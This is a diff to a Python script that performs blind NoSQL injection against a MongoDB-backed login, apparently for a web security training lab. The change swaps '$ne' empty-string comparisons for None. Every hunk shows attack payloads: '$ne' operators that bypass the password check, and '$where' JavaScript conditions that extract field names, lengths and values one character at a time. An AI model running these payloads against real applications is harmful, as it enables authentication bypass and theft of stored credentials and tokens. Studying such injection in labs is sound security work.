@@ -53,7 +53,7 @@ def get_field_count(url, field_count):
     payload = {
         "username": "wiener",
         "password": {
-            "$ne": ""
+            "$ne": None
         },
         "$where": f"function(){{ if (Object.keys(this).length=={field_count}) return 1; else return 0; }}"
     }
@@ -63,7 +63,7 @@ def get_field_length(url, field_index, length):
     payload = {
         "username": "wiener",
         "password": {
-            "$ne": ""
+            "$ne": None
         },
         "$where": f"function(){{ if (Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
     }
@@ -73,7 +73,7 @@ def get_field_value_length(url, field_name, length):
     payload = {
         "username": "wiener",
         "password": {
-            "$ne": ""
+            "$ne": None
         },
         "$where": f"function(){{ if (this.{field_name}.valueOf().toString().length=={length}) return 1; else return 0; }}"
     }
@@ -136,7 +136,7 @@ def get_field_char(url, field_index, position, character):
     payload = {
         "username": "wiener",
         "password": {
-            "$ne": ""
+            "$ne": None
         },
         "$where": f"function(){{ if (Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
     }
@@ -148,7 +148,7 @@ def get_field_value_char(url, field_name, position, character):
     payload = {
         "username": "wiener",
         "password": {
-            "$ne": ""
+            "$ne": None
         },
         "$where": f"function(){{ if (this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
     }
